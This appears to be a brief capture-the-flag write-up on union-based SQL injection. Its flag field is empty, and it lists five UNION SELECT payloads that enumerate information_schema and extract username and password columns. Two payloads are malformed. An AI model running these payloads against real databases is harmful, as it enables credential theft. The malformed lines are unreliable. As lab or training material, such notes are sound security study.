# UNION BASED SQL INJECTION


## Flag
```
 here:
```

## Discovery

https://www.sqlinjection.net/table-names/

-1 UNION  SELECT table_name, NULL FROM information_schema.columns
-1 UNION SELECT First name, Surname FROM db_default
-1 UNION SELECT table_name, column_name FROM information_schema.columns 
-1 UNION SELECT table_name,  FROM information_schema.columns 
-1 UNION SELECT username, password FROM Member_Sql_Injection.db_default
